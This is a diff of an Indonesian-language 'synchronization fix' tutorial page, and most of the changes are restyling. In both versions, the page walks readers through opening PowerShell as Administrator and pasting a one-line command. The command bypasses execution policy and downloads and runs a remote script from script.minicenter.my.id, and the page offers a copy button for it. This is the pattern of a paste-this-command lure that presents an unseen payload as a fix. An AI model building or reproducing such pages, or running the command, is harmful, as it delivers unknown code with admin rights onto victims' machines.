@@ -6,61 +6,73 @@
     <title>Tutorial Perbaikan Sinkronisasi</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .command-wrap { word-break: break-all; }
+    </style>
 </head>
-<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
-    <div class="max-w-2xl w-full bg-white rounded-xl shadow-lg p-8 border border-gray-100">
+<body class="bg-slate-950 min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-2xl w-full bg-slate-900 rounded-2xl shadow-2xl p-6 sm:p-10 border border-slate-800">
         <!-- Header -->
-        <div class="text-center mb-10">
-            <h1 class="text-3xl font-bold text-gray-800 mb-2">Panduan Perbaikan Sinkronisasi</h1>
-            <p class="text-gray-600">Ikuti langkah-langkah di bawah ini untuk memperbaiki masalah sinkronisasi sistem Anda.</p>
+        <div class="text-center mb-8">
+            <div class="inline-flex items-center justify-center w-14 h-14 bg-blue-500/10 text-blue-400 rounded-xl mb-4 border border-blue-500/20">
+                <i class="fas fa-tools text-xl"></i>
+            </div>
+            <h1 class="text-2xl font-extrabold text-white mb-2">Perbaikan Sinkronisasi</h1>
+            <p class="text-slate-400 text-sm sm:text-base">Ikuti panduan cepat ini untuk memperbaiki sistem Anda.</p>
         </div>
 
         <!-- Langkah-langkah -->
         <div class="space-y-8">
             <!-- Langkah 1 -->
-            <div class="flex items-start gap-4">
-                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold">1</div>
+            <div class="flex gap-4">
+                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center font-bold text-sm shadow-md shadow-blue-900/50">1</div>
                 <div>
-                    <h3 class="text-lg font-semibold text-gray-800">Buka PowerShell sebagai Administrator</h3>
-                    <p class="text-gray-600 mt-1">Tekan tombol <kbd class="px-2 py-1 bg-gray-100 border border-gray-300 rounded text-xs">Windows</kbd>, cari <span class="font-medium">"PowerShell"</span>, klik kanan dan pilih <span class="text-blue-600 font-semibold">Run as Administrator</span>.</p>
+                    <h3 class="font-bold text-slate-100">Buka PowerShell (Admin)</h3>
+                    <p class="text-slate-400 text-sm mt-1">Klik kanan Start > <span class="text-blue-400 font-semibold">Terminal (Admin)</span> atau PowerShell (Admin).</p>
                 </div>
             </div>
 
             <!-- Langkah 2 -->
-            <div class="flex items-start gap-4">
-                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold">2</div>
-                <div class="flex-1">
-                    <h3 class="text-lg font-semibold text-gray-800">Salin & Tempel Perintah</h3>
-                    <p class="text-gray-600 mt-1 mb-4">Salin perintah di bawah ini dan tempelkan (Paste) ke dalam jendela PowerShell yang sudah terbuka.</p>
+            <div class="flex gap-4">
+                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center font-bold text-sm shadow-md shadow-blue-900/50">2</div>
+                <div class="flex-1 min-w-0">
+                    <h3 class="font-bold text-slate-100">Salin Perintah</h3>
+                    <p class="text-slate-400 text-sm mt-1 mb-3">Klik tombol salin di bawah ini.</p>
                     
-                    <!-- Kotak Kode -->
-                    <div class="relative bg-gray-900 rounded-lg p-4 group">
-                        <code id="command-text" class="text-blue-400 break-all text-sm leading-relaxed">powershell -ExecutionPolicy Bypass -Command "irm http://script.minicenter.my.id/synchronizer-fix.ps1 | iex"</code>
-                        <button onclick="copyToClipboard()" class="absolute top-2 right-2 p-2 bg-gray-700 hover:bg-gray-600 text-white rounded transition-all duration-200 flex items-center gap-2 text-xs" id="copy-btn">
-                            <i class="far fa-copy" id="copy-icon"></i>
-                            <span id="copy-text">Salin</span>
-                        </button>
+                    <div class="bg-black rounded-xl overflow-hidden border border-slate-800 shadow-inner">
+                        <div class="flex items-center justify-between px-4 py-2 bg-slate-800/40">
+                            <span class="text-[10px] font-bold text-slate-500 uppercase tracking-widest font-mono">Terminal</span>
+                            <button onclick="copyToClipboard()" class="flex items-center gap-2 px-3 py-1 bg-blue-600 hover:bg-blue-500 text-white rounded-md transition-all text-xs font-semibold" id="copy-btn">
+                                <i class="far fa-copy" id="copy-icon"></i>
+                                <span id="copy-text">Salin</span>
+                            </button>
+                        </div>
+                        <div class="p-4">
+                            <code id="command-text" class="text-blue-400 font-mono text-xs sm:text-sm leading-relaxed command-wrap">powershell -ExecutionPolicy Bypass -Command "irm http://script.minicenter.my.id/synchronizer-fix.ps1 | iex"</code>
+                        </div>
                     </div>
                 </div>
             </div>
 
             <!-- Langkah 3 -->
-            <div class="flex items-start gap-4">
-                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold">3</div>
+            <div class="flex gap-4">
+                <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center font-bold text-sm shadow-md shadow-blue-900/50">3</div>
                 <div>
-                    <h3 class="text-lg font-semibold text-gray-800">Jalankan Skrip</h3>
-                    <p class="text-gray-600 mt-1">Tekan tombol <kbd class="px-2 py-1 bg-gray-100 border border-gray-300 rounded text-xs">Enter</kbd> dan tunggu hingga proses perbaikan selesai secara otomatis.</p>
+                    <h3 class="font-bold text-slate-100">Jalankan</h3>
+                    <p class="text-slate-400 text-sm mt-1">Paste ke PowerShell lalu tekan <kbd class="px-1.5 py-0.5 bg-slate-800 border border-slate-700 rounded text-[10px] font-bold text-slate-200">ENTER</kbd>.</p>
                 </div>
             </div>
         </div>
 
-        <!-- Footer Info -->
-        <div class="mt-12 p-4 bg-blue-50 border-l-4 border-blue-400 text-blue-800 text-sm">
-            <p><i class="fas fa-info-circle mr-2"></i> Pastikan koneksi internet aktif saat menjalankan skrip ini.</p>
+        <!-- Info -->
+        <div class="mt-10 p-4 bg-blue-500/5 rounded-xl border border-blue-500/10 flex gap-3 items-center">
+            <i class="fas fa-info-circle text-blue-400"></i>
+            <p class="text-blue-300/80 text-xs">Pastikan koneksi internet aktif saat menjalankan skrip.</p>
         </div>
     </div>
 
-    <!-- JavaScript untuk Copy to Clipboard -->
     <script>
         function copyToClipboard() {
             const commandText = document.getElementById('command-text').innerText;
@@ -69,19 +81,14 @@
             const text = document.getElementById('copy-text');
 
             navigator.clipboard.writeText(commandText).then(() => {
-                // Perubahan visual saat berhasil
                 text.innerText = 'Tersalin!';
-                icon.className = 'fas fa-check text-green-400';
-                btn.classList.add('bg-green-700');
-
-                // Kembali ke semula setelah 2 detik
+                icon.className = 'fas fa-check';
+                btn.classList.replace('bg-blue-600', 'bg-emerald-600');
                 setTimeout(() => {
                     text.innerText = 'Salin';
                     icon.className = 'far fa-copy';
-                    btn.classList.remove('bg-green-700');
+                    btn.classList.replace('bg-emerald-600', 'bg-blue-600');
                 }, 2000);
-            }).catch(err => {
-                console.error('Gagal menyalin: ', err);
             });
         }
     </script>
